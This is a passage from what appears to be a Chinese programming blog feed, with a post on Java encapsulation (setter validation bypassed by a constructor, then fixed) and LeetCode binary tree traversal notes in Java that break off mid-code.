class="comment">//封装一个类，要求有以下属性：年龄、工资、名字</span></span><br><span class="line"><span class="comment">//其中年龄要在1-120之间，工资不能直接查看、name的长度要在2-6字符之间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(age&gt;=<span class="number">1</span> &amp;&amp; age&lt;= <span class="number">120</span>)&#123;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;年龄要在1-120岁之间&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.age = <span class="number">18</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getSalary</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//可以加一个密码校验缓解</span></span><br><span class="line">        <span class="keyword">return</span> salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSalary</span><span class="params">(<span class="type">double</span> salary)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.salary = salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(name.length()&gt;=<span class="number">2</span> &amp;&amp; name.length()&lt;=<span class="number">6</span>)&#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;名字长度需要为2-6个字符&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">info</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;信息为： name = &quot;</span>+ name +<span class="string">&quot; age = &quot;</span> + age + <span class="string">&quot;salary = &quot;</span>+salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="封装与构造器"><a href="#封装与构造器" class="headerlink" title="封装与构造器"></a>封装与构造器</h2><p>前面对person中的一些属性加了访问修饰符还有一些属性限制，例如name长度、age年龄、薪水无法访问等等。</p>
<p>但如果在Person类里面添加一个默认的构造器，就会发现：通过get、set这些方法进行的限制就会失效。验证代码如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.encap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.Period;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">encapsulation01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//Person person = new Person();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">smith</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;smith&quot;</span>,<span class="number">20000</span>,<span class="number">400000.0</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;---smith的信息如下：---&quot;</span>);</span><br><span class="line">        System.out.println(smith.info());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//封装一个类，要求有以下属性：年龄、工资、名字</span></span><br><span class="line"><span class="comment">//其中年龄要在1-120之间，工资不能直接查看、name的长度要在2-6字符之间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age, <span class="type">double</span> salary)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.salary = salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(age&gt;=<span class="number">1</span> &amp;&amp; age&lt;= <span class="number">120</span>)&#123;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;年龄要在1-120岁之间&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.age = <span class="number">18</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getSalary</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//可以加一个密码校验缓解</span></span><br><span class="line">        <span class="keyword">return</span> salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSalary</span><span class="params">(<span class="type">double</span> salary)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.salary = salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(name.length()&gt;=<span class="number">2</span> &amp;&amp; name.length()&lt;=<span class="number">6</span>)&#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;名字长度需要为2-6个字符&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">info</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;信息为： name = &quot;</span>+ name +<span class="string">&quot; age = &quot;</span> + age + <span class="string">&quot;salary = &quot;</span>+salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>终端显示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---smith的信息如下：---</span><br><span class="line">信息为： name = smith age = 20000salary = 400000.0</span><br></pre></td></tr></table></figure>

<p>可以看到突破了限制。</p>
<p>这种情况如何在构造器中也能限制呢？——可以将set方法写在构造器中，这样仍然可以验证。构造器里面应该这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age, <span class="type">double</span> salary)</span> &#123;</span><br><span class="line"><span class="comment">//        this.name = name;</span></span><br><span class="line"><span class="comment">//        this.age = age;</span></span><br><span class="line"><span class="comment">//        this.salary = salary;</span></span><br><span class="line">        <span class="comment">//我们可以将set方法写在构造器中，这样仍然可以验证</span></span><br><span class="line">        <span class="built_in">this</span>.setName(name);</span><br><span class="line">        <span class="built_in">this</span>.setAge(age);</span><br><span class="line">        <span class="built_in">this</span>.setSalary(salary);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode——树</title>
    <url>/2022/05/01/16-leetcode%E2%80%94%E2%80%94%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下leetcode树部分题目的刷题笔记</p>
<h1 id="一、二叉树的深度优先遍历"><a href="#一、二叉树的深度优先遍历" class="headerlink" title="一、二叉树的深度优先遍历"></a>一、二叉树的深度优先遍历</h1><ul>
<li>前序遍历</li>
<li>中序遍历</li>
<li>后序遍历</li>
</ul>
<p>这三种遍历方式，我个人比较倾向于递归法来实现，因为递归法的代码简洁，三种遍历的写法很类似。</p>
<p>其实还可以使用<a href="https://programmercarl.com/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%BB%9F%E4%B8%80%E8%BF%AD%E4%BB%A3%E6%B3%95.html#%E8%BF%AD%E4%BB%A3%E6%B3%95%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86">统一迭代法</a>来实现这三种遍历方式，但个人觉得还是有点难记~可以当作扩展来了解</p>
<h2 id="94-二叉树的中序遍历"><a href="#94-二叉树的中序遍历" class="headerlink" title="94. 二叉树的中序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal/">94. 二叉树的中序遍历</a></h2><blockquote>
<p>给定一个二叉树的根节点 <code>root</code> ，返回 <em>它的 <strong>中序</strong> 遍历</em> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,null,2,3]</span><br><span class="line">输出：[1,3,2]</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路：递归"><a href="#思路：递归" class="headerlink" title="思路：递归"></a>思路：递归</h3><p>首先我们需要了解什么是二叉树的中序遍历：按照访问左子树——根节点——右子树的方式遍历这棵树，而在访问左子树或者右子树的时候我们按照同样的方式遍历，直到遍历完整棵树。因此整个遍历过程天然具有递归的性质，我们可以直接用递归函数来模拟这一过程。</p>
<p>定义 inorder(root) 表示当前遍历到 root 节点的答案，那么按照定义，我们只要递归调用 inorder(root.left) 来遍历 root 节点的左子树，然后将 root 节点的值加入答案，再递归调用inorder(root.right) 来遍历 root 节点的右子树即可，递归终止的条件为碰到空节点。</p>
<span id="more"></span>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; nums = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        inorder(root,nums);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inorder</span><span class="params">(TreeNode root , List&lt;Integer&gt; res)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root != <span class="literal">null</span>)&#123;</span><br><span class="line">            inorder(root.left,res);</span><br><span class="line">            res.add(root.val);</span><br><span class="line">            inorder(root.right,res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：0 ms, 在所有 Java 提交中击败了100.00%的用户</li>
<li>内存消耗：39.7 MB, 在所有 Java 提交中击败了21.80%的用户</li>
<li>通过测试用例：70 &#x2F; 70</li>
</ul>
<h2 id="144-二叉树的前序遍历"><a href="#144-二叉树的前序遍历" class="headerlink" title="144. 二叉树的前序遍历"></a><a href="https://leetcode.cn/problems/binary-tree-preorder-traversal/">144. 二叉树的前序遍历</a></h2><blockquote>
<p>给你二叉树的根节点 <code>root</code> ，返回它节点值的 <strong>前序</strong> 遍历。</p>
<p>例1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,null,2,3]</span><br><span class="line">输出：[1,2,3]</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路：递归-1"><a href="#思路：递归-1" class="headerlink" title="思路：递归"></a>思路：递归</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Definition for a binary tree node.</span><br><span class="line"> * public class TreeNode &#123;</span><br><span class="line"> *     int val;</span><br><span class="line"> *     TreeNode left;</span><br><span class="line"> *     TreeNode right;</span><br><span class="line"> *     TreeNode() &#123;&#125;</span><br><span class="line"> *     TreeNode(int val) &#123; this.val = val; &#125;</span><br><span class="line"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span><br><span class="line"> *         this.val = val;</span><br><span class="line"> *         this.left = left;</span><br><span class="line"> *         this.right = right;</span><br><span class="line"> *     &#125;</span><br><span class="line"> * &#125;</span><br><span class="line"> */</span><br><span class="line">class Solution &#123;</span><br><span class="line">    public List&lt;Integer&gt; preorderTraversal(TreeNode root) &#123;</span><br><span class="line">        List&lt;Integer&gt; ans = new ArrayList&lt;Integer&gt;();</span><br><span class="line">        inorder(root,ans);</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void inorder(TreeNode root,List&lt;Integer&gt; ans)&#123;</span><br><span class="line">        if(root != null)&#123;</span><br><span class="line">            ans.add(root.val);</span><br><span class="line">            inorder(root.left,ans);</span><br><span class="line">            inorder(root.right,ans);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="145-二叉树的后序遍历"><a href="#145-二叉树的后序遍历" class="headerlink" title="145. 二叉树的后序遍历"></a><a href="https://leetcode.cn/problems/binary-tree-postorder-traversal/">145. 二叉树的后序遍历</a></h2><h3 id="思路：递归-2"><a href="#思路：递归-2" class="headerlink" title="思路：递归"></a>思路：递归</h3><p>还是和前面两题一样，二叉树的三种递归遍历写法都是一样的，只是有略微的改变而已</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        inorder(root , ans);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inorder</span><span class="params">(TreeNode root , List&lt;Integer&gt; ans)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root != <span class="literal">null</span>)&#123;</span><br><span class="line">            inorder(root.left, ans);</span><br><span class="line">            inorder(root.right , ans);</span><br><span class="line">            ans.add(root.val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="二、二叉树的广度优先遍历（层序遍历）"><a href="#二、二叉树的广度优先遍历（层序遍历）" class="headerlink" title="二、二叉树的广度优先遍历（层序遍历）"></a>二、二叉树的广度优先遍历（层序遍历）</h1><p>接下来的例题是二叉树的另一种遍历方式：层序遍历。</p>
<p>层序遍历一个二叉树。就是从左到右一层一层的去遍历二叉树。这种遍历的方式和之前的深度优先遍历都不太一样。</p>
<p>需要借用一个辅助数据结构即队列来实现，<strong>队列先进先出，符合一层一层遍历的逻辑，而是用栈先进后出适合模拟深度优先遍历也就是递归的逻辑。</strong></p>
<p><strong>而这种层序遍历方式就是图论中的广度优先遍历，只不过我们应用在二叉树上。</strong></p>
<h2 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a href="https://leetcode.cn/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></h2><blockquote>
<p>给你二叉树的根节点 <code>root</code> ，返回其节点值的 <strong>层序遍历</strong> 。 （即逐层地，从左到右访问所有节点）</p>
<p><strong>示例 1</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [3,9,20,null,null,15,7]</span><br><span class="line">输出：[[3],[9,20],[15,7]]</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路1：迭代-队列"><a href="#思路1：迭代-队列" class="headerlink" title="思路1：迭代+队列"></a>思路1：迭代+队列</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; resList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        checkFun(root);</span><br><span class="line">        <span class="keyword">return</span> resList; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkFun</span><span class="params">(TreeNode node)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) <span class="keyword">return</span> ;</span><br><span class="line">        Queue&lt;TreeNode&gt; que = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;TreeNode&gt;();</span><br><span class="line">        que.offer(node);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!que.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> que.size();</span><br><span class="line">            List&lt;Integer&gt; item = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(len &gt; <span class="number">0</span> )&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">tempNode</span> <span class="operator">=</span> que.poll();</span><br><span class="line">                item.add(tempNode.val);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(tempNode.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    que.offer(tempNode.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(tempNode.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    que.offer(tempNode.right);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                len--;</span><br><span class="line">            &#125;</span><br><span class="line">            resList.add(item);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路2：递归"><a href="#思路2：递归" class="headerlink" title="思路2：递归"></a>思路2：递归</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; resList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        checkFun01(root,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> resList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//DFS--递归方式</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkFun01</span><span class="params">(TreeNode node, Integer deep)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        deep++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (resList.size() &lt; deep) &#123;</span><br><span class="line">            <span class="comment">//当层级增加时，list的Item也增加，利用list的索引值进行层级界定</span></span><br><span class="line">            List&lt;Integer&gt; item = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">            resList.add(item);</span><br><span class="line">        &#125;</span><br><span class="line">        resList.get(deep - <span class="number">1</span>).add(node.val);</span><br><span class="line"></span><br><span class="line">        checkFun01(node.left, deep);</span><br><span class="line">        checkFun01(node.right, deep);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="107-二叉树的层序遍历-II"><a href="#107-二叉树的层序遍历-II" class="headerlink" title="107. 二叉树的层序遍历 II"></a><a href="https://leetcode.cn/problems/binary-tree-level-order-traversal-ii/">107. 二叉树的层序遍历 II</a></h2><blockquote>
<p>给你二叉树的根节点 <code>root</code> ，返回其节点值 <strong>自底向上的层序遍历</strong> 。 （即按从叶子节点所在层到根节点所在的层，逐层从左向右遍历）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [3,9,20,null,null,15,7]</span><br><span class="line">输出：[[15,7],[9,20],[3]]</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路：递归-列表翻转"><a href="#思路：递归-列表翻转" class="headerlink" title="思路：递归+列表翻转"></a>思路：递归+列表翻转</h3><p>和前面一题同样解法，只不过加上了一个列表反转。这里采用的是递归，因为发现递归似乎更快一些~</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; resList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrderBottom</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        checkFun(root,<span class="number">0</span>);</span><br><span class="line">        Collections.reverse(resList);</span><br><span class="line">        <span class="keyword">return</span> resList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkFun</span><span class="params">(TreeNode node , <span class="type">int</span> deep)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) <span class="keyword">return</span> ;</span><br><span class="line">        deep++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(resList.size() &lt; deep)&#123;</span><br><span class="line">            List&lt;Integer&gt; item = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">            resList.add(item);</span><br><span class="line">        &#125;</span><br><span class="line">        resList.get(deep-<span class="number">1</span>).add(node.val);</span><br><span class="line"></span><br><span class="line">        checkFun(node.left,deep);</span><br><span class="line">        checkFun(node.right,deep);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="199-二叉树的右视图"><a href="#199-二叉树的右视图" class="headerlink" title="199. 二叉树的右视图"></a><a href="https://leetcode.cn/problems/binary-tree-right-side-view/">199. 二叉树的右视图</a></h2><blockquote>
<p>给定一个二叉树的 <strong>根节点</strong> <code>root</code>，想象自己站在它的右侧，按照从顶部到底部的顺序，返回从右侧所能看到的节点值。</p>
</blockquote>
<p><img src="https://assets.leetcode.com/uploads/2021/02/14/tree.jpg"></p>
<h3 id="思路：广度优先搜索"><a href="#思路：广度优先搜索" class="headerlink" title="思路：广度优先搜索"></a>思路：广度优先搜索</h3><p>先获取广度优先结果，再将广度优先结果中每层的最后一个元素（也就是右视图）保留下来。</p>
<p>这里实现主体还是用的前面的递归，想法似乎有点复杂</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; resList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title 